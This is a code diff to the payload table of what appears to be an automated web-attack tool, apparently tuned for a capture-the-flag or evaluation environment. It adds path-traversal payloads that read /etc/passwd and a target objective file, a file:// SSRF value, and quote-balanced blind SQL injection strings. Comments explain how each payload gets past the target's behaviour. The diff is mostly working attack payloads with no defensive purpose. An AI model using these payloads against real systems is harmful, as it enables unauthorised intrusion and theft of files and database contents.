@@ -91,11 +91,22 @@ def session_fixation(base, clues):
 _PARAM_PAYLOADS = {
     "id": ["1", "0", "2", "admin"],
     "user": ["admin", "0", "1"], "user_id": ["1", "0", "2"], "uid": ["1", "0"],
-    "file": ["../../../../etc/passwd", "../app.py", "index.html"],
-    "path": ["../../../../etc/passwd", "../app.py"], "page": ["../../../../etc/passwd"],
+    # LFI: a PHP viewer silently returns the NORMAL page for shallow traversal, so go deep (>= 3 `../`) and
+    # target the absolute path the prompt names on this event -- measured /run/huntress/objective.txt. `doc`
+    # is the viewer's param name on this lane's LFI family and was missing from the ladder.
+    "file": ["../../../../etc/passwd", "../../../../../run/huntress/objective.txt", "../app.py", "index.html"],
+    "path": ["../../../../etc/passwd", "../../../../../run/huntress/objective.txt", "../app.py"],
+    "page": ["../../../../etc/passwd", "../../../../../run/huntress/objective.txt"],
+    "doc": ["../../../../../run/huntress/objective.txt", "../../../../etc/passwd"],
     "url": ["http://127.0.0.1/", "http://localhost/", "file:///etc/passwd"],
-    "q": ["' OR '1'='1", "') OR ('1'='1", "1 OR 1=1"], "search": ["' OR '1'='1"],
-    "name": ["' OR '1'='1"], "q2": ["' OR '1'='1"],
+    # Blind SQLi: the search interpolates `q` into an EVEN number of `col LIKE '%q%'` clauses, so the classic
+    # tautology pair (`' OR '1'='1` / `'...'='2`) is NOT an oracle -- both return all rows. A QUOTE-BALANCED
+    # payload (`nope' OR (<cond>) OR '1'='2`) makes every literal clause false and reduces the WHERE to <cond>,
+    # surfacing the hidden proof row directly (the proof sits in a `summary`-like column).
+    "q": ["' OR '1'='1", "') OR ('1'='1", "1 OR 1=1",
+          "nope' OR (summary LIKE 'proof%') OR '1'='2", "nope' OR 1=1 OR '1'='2"],
+    "search": ["' OR '1'='1", "nope' OR (summary LIKE 'proof%') OR '1'='2"],
+    "name": ["' OR '1'='1", "nope' OR (summary LIKE 'proof%') OR '1'='2"], "q2": ["' OR '1'='1"],
 }
 _PRIV_ROLES = ("admin", "administrator", "moderator", "root", "superuser")
 
